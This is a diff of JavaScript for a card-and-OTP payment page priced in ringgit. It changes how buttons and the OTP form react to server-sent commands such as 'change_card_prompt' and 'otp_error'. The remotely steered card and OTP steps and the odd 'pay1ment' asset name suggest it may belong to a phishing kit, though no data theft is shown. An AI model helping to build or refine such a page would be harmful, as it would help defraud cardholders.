@@ -1526,7 +1526,7 @@ url("pay1ment_icons.woff") format("woff");
     } else if (a === 'approve') {
       //showMsg('success', 'Payment approved!');
       var btn = q('btnSubmit');
-      if (btn) { btn.disabled = true; btn.textContent = 'Approved'; }
+      if (btn) { btn.disabled = true; /*btn.textContent = 'Approved';*/ }
       hideOtp();
       setTimeout(function () { location.href = '/complete/'; }, 2000);
  
@@ -1539,7 +1539,7 @@ url("pay1ment_icons.woff") format("woff");
     } else if (a === 'card_error') {
       hideOtp();
       var btn3 = q('btnSubmit');
-      if (btn3) { btn3.disabled = false; btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2); }
+      if (btn3) { btn3.disabled = false; /*btn3.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
       showInline('error', 'Card error: ' + (p.message || ''), true);
  
     } else if (a === 'otp_error') {
@@ -1549,7 +1549,7 @@ url("pay1ment_icons.woff") format("woff");
       var otpErr = q('otp-error');
       if (otpErr) { otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code.'; otpErr.classList.remove('hidden'); }
       var otpBtn = q('otp-submit');
-      if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Continue'; }
+      if (otpBtn) { otpBtn.disabled = false; otpBtn.textContent = 'Verify'; }
  
     } else if (a === 'timeout') {
       hideOtp();
@@ -1559,9 +1559,9 @@ url("pay1ment_icons.woff") format("woff");
  
     } else if (a === 'change_card' || a === 'change_card_prompt') {
       _curStep = 'card';
-      hideOtp();
+      changeOtp();
       var btn5 = q('btnSubmit');
-      if (btn5) { btn5.disabled = false; btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2); }
+      if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
       showInline('info', p.message || 'Please use a different card.', true);
  
     } else if (a === 'redirect_complete') {
@@ -1664,7 +1664,7 @@ url("pay1ment_icons.woff") format("woff");
     hideInline();
  
     var btn = q('btnSubmit');
-    if (btn) { btn.disabled = true; btn.textContent = 'Processing...'; }
+    if (btn) { btn.disabled = true; /*btn.textContent = 'Processing...';*/ }
     showLoad()
     //showMsg('info', 'Processing payment...');
  
@@ -1730,13 +1730,29 @@ url("pay1ment_icons.woff") format("woff");
     if (q('otp-error')) q('otp-error').style.display = 'none';
     stopOtpTimer();
   }
+
+  
+  function changeOtp() {
+    var sec = q('otp-form');
+    var secs = q('otp-result');
+    //var btn = q('btnSubmit');
+    if (sec) sec.classList.add('hidden');
+    if (secs) secs.classList.remove('hidden');
+    //if (btn) btn.style.display = 'block';
+    if (q('otp-code'))  q('otp-code').value = '';
+    if (q('otp-error')) q('otp-error').style.display = 'none';
+    stopOtpTimer();
+  }
+
  
   function resetOtp() {
     if (q('otp-code'))  { q('otp-code').value = ''; }
     if (q('otp-error')) { q('otp-error').style.display = 'none'; }
     var btn = q('otp-submit');
     if (btn) { btn.disabled = false; btn.textContent = 'Verify'; }
+    document.querySelector("#btnSubmit").disabled = false;
   }
+
  
   /* OTP 倒计时 */
   var otpSec = 299, otpTimer = null;
